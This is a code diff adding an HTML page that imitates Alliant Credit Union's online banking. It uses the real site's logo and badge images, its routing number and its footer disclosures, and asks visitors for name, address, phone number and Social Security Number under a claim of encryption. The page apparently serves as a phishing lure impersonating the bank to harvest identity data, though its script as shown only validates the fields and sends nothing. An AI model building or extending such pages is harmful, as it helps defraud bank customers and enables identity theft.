@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Alliant – Personal information</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background: #ffffff;
+      color: #333;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    /* ---------- TOP SPLIT ---------- */
+    .top {
+      height: 100vh;
+      display: flex;
+    }
+
+    /* LEFT PANEL – personal information form */
+    .left {
+      flex: 1;
+      width: 30%;
+      background: #ffffff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      padding: 0 40px;
+      font-family: Arial, Helvetica, sans-serif;
+      color: #333;
+    }
+
+    .left > * {
+      max-width: 340px;
+      width: 100%;
+    }
+
+    .logo {
+      width: 230px;
+      margin-bottom: 50px;
+    }
+
+    .secure-login {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 28px;
+      color: #333;
+      margin-bottom: 16px;
+    }
+
+    .secure-login .lock {
+      font-size: 22px;
+    }
+
+    .personal-sub {
+      font-size: 15px;
+      color: #627277;
+      line-height: 1.5;
+      margin-bottom: 28px;
+      max-width: 340px;
+    }
+
+    .personal-sub strong {
+      color: #333;
+      font-weight: 600;
+    }
+
+    /* ---- form fields ---- */
+    .field {
+      margin-bottom: 22px;
+    }
+
+    .field-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: baseline;
+      margin-bottom: 8px;
+    }
+
+    .field-row label {
+      font-size: 15px;
+      color: #333;
+      font-weight: 500;
+    }
+
+    .field-row a {
+      font-size: 13px;
+      color: #2b7a9e;
+      text-decoration: none;
+    }
+
+    .input-wrap {
+      position: relative;
+    }
+
+    .field input {
+      width: 100%;
+      padding: 10px 14px;
+      font-size: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      outline: none;
+      transition: border 0.15s, box-shadow 0.15s;
+      background: #fff;
+      color: #333;
+    }
+
+    .field input:focus {
+      border-color: #7fb3e0;
+      box-shadow: 0 0 0 3px rgba(123, 164, 40, 0.1);
+    }
+
+    .field input::placeholder {
+      color: #aaa;
+      font-size: 14px;
+    }
+
+    /* two-column row */
+    .field-split {
+      display: flex;
+      gap: 16px;
+      margin-bottom: 22px;
+    }
+
+    .field-split .field {
+      flex: 1;
+      margin-bottom: 0;
+    }
+
+    /* three-column row */
+    .field-split-3 {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 22px;
+    }
+
+    .field-split-3 .field {
+      flex: 1;
+      margin-bottom: 0;
+    }
+
+    /* small icons inside inputs */
+    .input-wrap .input-icon {
+      position: absolute;
+      right: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #999;
+      font-size: 15px;
+      pointer-events: none;
+    }
+
+    .input-wrap .cvv-hint {
+      position: absolute;
+      right: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #2b7a9e;
+      font-size: 12px;
+      font-weight: 500;
+      cursor: help;
+      pointer-events: auto;
+    }
+
+    /* ---- primary button ---- */
+    .primary-btn {
+      background: #7ba428;
+      color: #fff;
+      border: none;
+      border-radius: 30px;
+      padding: 12px 75px;
+      font-size: 18px;
+      cursor: pointer;
+      margin-bottom: 20px;
+      width: auto;
+      align-self: flex-start;
+      transition: background 0.2s;
+    }
+
+    .primary-btn:hover {
+      background: #6b9122;
+    }
+
+    .primary-btn:disabled {
+      background: #b5cc85;
+      cursor: not-allowed;
+    }
+
+    /* ---- back link ---- */
+    .back-link {
+      font-size: 15px;
+      color: #627277;
+    }
+
+    .back-link a {
+      color: #2b7a9e;
+      text-decoration: none;
+      margin-left: 4px;
+      font-weight: 500;
+    }
+
+    .back-link a:hover {
+      text-decoration: underline;
+    }
+
+    /* security note */
+    .security-note {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 12px;
+      color: #888;
+      margin-top: 16px;
+      max-width: 340px;
+    }
+
+    .security-note svg {
+      flex-shrink: 0;
+    }
+
+    /* RIGHT PANEL – blue presentation */
+    .right {
+      flex: 2;
+      width: 70%;
+      background: #00A3E0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .right img {
+      width: 70%;
+      max-width: 700px;
+      filter: drop-shadow(0 8px 16px rgba(0, 0, 0, 0.08));
+    }
+
+    /* ---------- FOOTER ---------- */
+    .bottom {
+      background: #ffffff;
+      border-top: 1px solid #ddd;
+      display: flex;
+      align-items: flex-start;
+      gap: 40px;
+      padding: 18px 50px;
+      font-family: Arial, Helvetica, sans-serif;
+      color: #555;
+    }
+
+    .badges {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      flex-shrink: 0;
+    }
+
+    .badge-housing {
+      width: 100px;
+      height: 100%;
+    }
+
+    .badge-ncua {
+      width: 180px;
+    }
+
+    .footer-content {
+      font-size: 15px;
+    }
+
+    .footer-links {
+      margin-bottom: 10px;
+    }
+
+    .footer-links a {
+      color: #2b7a9e;
+      text-decoration: none;
+      margin: 0 14px;
+    }
+
+    .footer-links a:first-child {
+      margin-left: 0;
+    }
+
+    .footer-links .sep {
+      color: #ccc;
+    }
+
+    .footer-row {
+      margin-bottom: 10px;
+    }
+
+    .footer-row a {
+      color: #2b7a9e;
+      text-decoration: none;
+      margin-right: 14px;
+    }
+
+    .footer-disclosure {
+      line-height: 1;
+      font-family: sans-serif;
+      color: #627277;
+    }
+
+    /* ---------- MOBILE ---------- */
+    @media (max-width: 768px) {
+      .top {
+        height: auto;
+        flex-direction: column;
+      }
+
+      .right {
+        display: none;
+      }
+
+      .left {
+        width: 100%;
+        justify-content: flex-start;
+        align-items: center;
+        text-align: center;
+        padding: 50px 25px 30px;
+      }
+
+      .left > * {
+        max-width: 480px;
+      }
+
+      .logo {
+        width: 250px;
+        margin: 20px auto 50px;
+        margin-bottom: 100px;
+      }
+
+      .secure-login {
+        justify-content: center;
+        font-size: 24px;
+      }
+
+      .personal-sub {
+        text-align: center;
+        max-width: 100%;
+      }
+
+      .field-row {
+        text-align: left;
+      }
+
+      .primary-btn {
+        margin-top: 20px;
+        width: 60%;
+        font-size: 16px;
+        align-self: center;
+        text-align: center;
+        padding: 12px 20px;
+        white-space: nowrap;
+      }
+
+      .back-link {
+        text-align: center;
+      }
+
+      .security-note {
+        justify-content: center;
+        text-align: left;
+      }
+
+      .field-split,
+      .field-split-3 {
+        flex-direction: column;
+        gap: 22px;
+      }
+
+      .bottom {
+        justify-content: center;
+        text-align: center;
+        padding: 25px;
+        border-top: none;
+      }
+
+      .badges {
+        display: none;
+      }
+
+      .footer-links a,
+      .footer-row a {
+        margin: 0 8px;
+        font-size: 12px;
+      }
+      .footer-row span {
+        font-size: 12px;
+      }
+
+      .footer-disclosure {
+        line-height: 1.4;
+        font-size: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="top">
+      <!-- LEFT: personal information form -->
+      <div class="left">
+        <img class="logo" src="https://www.alliantcreditunion.com/OnlineBanking/Content/alliant-logo.svg" alt="Alliant">
+
+        <div class="secure-login">
+          <svg class="lock" viewBox="0 0 24 24" width="22" height="22" fill="#222" aria-hidden="true">
+            <path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm3 8H9V6a3 3 0 0 1 6 0v3z"/>
+          </svg>
+          <span>Personal information</span>
+        </div>
+
+        <p class="personal-sub">
+          Please provide your <strong>personal details</strong> to continue. All fields are required.
+        </p>
+
+        <!-- Full name -->
+        <div class="field">
+          <div class="field-row">
+            <label for="fullName">Full name</label>
+          </div>
+          <div class="input-wrap">
+            <input type="text" id="fullName" name="fullName" placeholder="e.g. Jane M. Doe" autocomplete="name">
+          </div>
+        </div>
+
+        <!-- Street address -->
+        <div class="field">
+          <div class="field-row">
+            <label for="address">Street address</label>
+          </div>
+          <div class="input-wrap">
+            <input type="text" id="address" name="address" placeholder="e.g. 123 Main St, Apt 4B" autocomplete="street-address">
+          </div>
+        </div>
+
+        <!-- City, State, ZIP -->
+        <div class="field-split-3">
+          <div class="field" style="flex: 2;">
+            <div class="field-row">
+              <label for="city">City</label>
+            </div>
+            <div class="input-wrap">
+              <input type="text" id="city" name="city" placeholder="City" autocomplete="address-level2">
+            </div>
+          </div>
+          <div class="field" style="flex: 1;">
+            <div class="field-row">
+              <label for="state">State</label>
+            </div>
+            <div class="input-wrap">
+              <input type="text" id="state" name="state" placeholder="State" maxlength="2" autocomplete="address-level1">
+            </div>
+          </div>
+          <div class="field" style="flex: 1;">
+            <div class="field-row">
+              <label for="zip">ZIP</label>
+            </div>
+            <div class="input-wrap">
+              <input type="text" id="zip" name="zip" inputmode="numeric" placeholder="ZIP" maxlength="5" autocomplete="postal-code">
+            </div>
+          </div>
+        </div>
+
+        <!-- Phone number -->
+        <div class="field">
+          <div class="field-row">
+            <label for="phone">Phone number</label>
+          </div>
+          <div class="input-wrap">
+            <input type="text" id="phone" name="phone" inputmode="tel" placeholder="(555) 123-4567" maxlength="14" autocomplete="tel">
+            <span class="input-icon">
+              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="#999" stroke-width="2" aria-hidden="true">
+                <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/>
+              </svg>
+            </span>
+          </div>
+        </div>
+
+        <!-- SSN -->
+        <div class="field">
+          <div class="field-row">
+            <label for="ssn">Social Security Number</label>
+            <a href="#" title="We need your SSN to verify your identity.">Why?</a>
+          </div>
+          <div class="input-wrap">
+            <input type="text" id="ssn" name="ssn" inputmode="numeric" placeholder="XXX-XX-XXXX" maxlength="11" autocomplete="off">
+            <span class="cvv-hint" title="9-digit SSN, formatted XXX-XX-XXXX">?</span>
+          </div>
+        </div>
+
+        <button class="primary-btn" id="continueBtn">Continue</button>
+
+        <div class="back-link">
+          <a href="#" onclick="history.back(); return false;">← Back</a>
+        </div>
+
+        <div class="security-note">
+          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="#888" stroke-width="2" aria-hidden="true">
+            <rect x="4" y="11" width="16" height="10" rx="2"/>
+            <path d="M8 11V7a4 4 0 0 1 8 0v4"/>
+          </svg>
+          <span>Your personal information is encrypted and secure.</span>
+        </div>
+      </div>
+
+      <!-- RIGHT: blue panel -->
+      <div class="right">
+        <img src="https://www.alliantcreditunion.com/OnlineBanking/Content/login-presentation.png" alt="">
+      </div>
+    </div>
+
+    <!-- FOOTER -->
+    <div class="bottom">
+      <div class="badges">
+        <img class="badge-housing" src="https://www.alliantcreditunion.com/OnlineBanking/design/equal-housing-opportunity.png" alt="Equal Housing Opportunity">
+        <img class="badge-ncua" src="https://www.alliantcreditunion.com/OnlineBanking/design/ncua.png" alt="NCUA">
+      </div>
+
+      <div class="footer-content">
+        <div class="footer-links">
+          <a href="#">Disclosures</a><span class="sep">|</span>
+          <a href="#">Terms</a><span class="sep">|</span>
+          <a href="#">Privacy</a><span class="sep">|</span>
+          <a href="#">Accessibility</a>
+        </div>
+        <div class="footer-row">
+          <a href="#">Help Center</a><span class="sep">|</span>
+          <span style="margin-left:14px;">ABA Routing and Transit Number #271081528</span>
+        </div>
+        <div class="footer-disclosure">
+          Alliant Credit Union, Chicago, IL. Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States
+          Government - National Credit Union Administration (NCUA), a U.S. Government Agency. Ver: 1.0.0.0
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      const fullNameInput = document.getElementById('fullName');
+      const addressInput = document.getElementById('address');
+      const cityInput = document.getElementById('city');
+      const stateInput = document.getElementById('state');
+      const zipInput = document.getElementById('zip');
+      const phoneInput = document.getElementById('phone');
+      const ssnInput = document.getElementById('ssn');
+      const continueBtn = document.getElementById('continueBtn');
+
+      // --- Phone: auto-format (XXX) XXX-XXXX ---
+      phoneInput.addEventListener('input', (e) => {
+        let value = e.target.value.replace(/\D/g, '').slice(0, 10);
+        if (value.length >= 6) {
+          e.target.value = '(' + value.slice(0, 3) + ') ' + value.slice(3, 6) + '-' + value.slice(6);
+        } else if (value.length >= 4) {
+          e.target.value = '(' + value.slice(0, 3) + ') ' + value.slice(3);
+        } else if (value.length >= 1) {
+          e.target.value = '(' + value;
+        } else {
+          e.target.value = '';
+        }
+      });
+
+      // --- SSN: auto-format XXX-XX-XXXX ---
+      ssnInput.addEventListener('input', (e) => {
+        let value = e.target.value.replace(/\D/g, '').slice(0, 9);
+        if (value.length > 5) {
+          e.target.value = value.slice(0, 3) + '-' + value.slice(3, 5) + '-' + value.slice(5);
+        } else if (value.length > 3) {
+          e.target.value = value.slice(0, 3) + '-' + value.slice(3);
+        } else {
+          e.target.value = value;
+        }
+      });
+
+      // --- ZIP: digits only ---
+      zipInput.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 5);
+      });
+
+      // --- State: uppercase letters only ---
+      stateInput.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/[^a-zA-Z]/g, '').toUpperCase().slice(0, 2);
+      });
+
+      // --- Continue: validate required fields ---
+      continueBtn.addEventListener('click', () => {
+        const fields = [fullNameInput, addressInput, cityInput, stateInput, zipInput, phoneInput, ssnInput];
+        fields.forEach(inp => inp.style.borderColor = '#ccc');
+
+        let valid = true;
+
+        if (!fullNameInput.value.trim()) {
+          fullNameInput.style.borderColor = '#c0392b';
+          valid = false;
+        }
+        if (!addressInput.value.trim()) {
+          addressInput.style.borderColor = '#c0392b';
+          valid = false;
+        }
+        if (!cityInput.value.trim()) {
+          cityInput.style.borderColor = '#c0392b';
+          valid = false;
+        }
+        if (!stateInput.value.trim() || stateInput.value.length !== 2) {
+          stateInput.style.borderColor = '#c0392b';
+          valid = false;
+        }
+        if (!zipInput.value.trim() || zipInput.value.length !== 5) {
+          zipInput.style.borderColor = '#c0392b';
+          valid = false;
+        }
+        if (!phoneInput.value.trim() || phoneInput.value.replace(/\D/g, '').length !== 10) {
+          phoneInput.style.borderColor = '#c0392b';
+          valid = false;
+        }
+        if (!ssnInput.value.trim() || ssnInput.value.replace(/\D/g, '').length !== 9) {
+          ssnInput.style.borderColor = '#c0392b';
+          valid = false;
+        }
+
+        if (!valid) {
+          alert('Please fill in all personal information fields correctly.');
+          return;
+        }
+
+        continueBtn.textContent = 'Processing…';
+        continueBtn.disabled = true;
+        setTimeout(() => {
+          continueBtn.textContent = 'Continue';
+          continueBtn.disabled = false;
+        }, 800);
+      });
+
+      // reset red borders on input
+      [fullNameInput, addressInput, cityInput, stateInput, zipInput, phoneInput, ssnInput].forEach(inp => {
+        inp.addEventListener('input', () => {
+          inp.style.borderColor = '#ccc';
+        });
+      });
+    })();
+  </script>
+</body>
+</html>
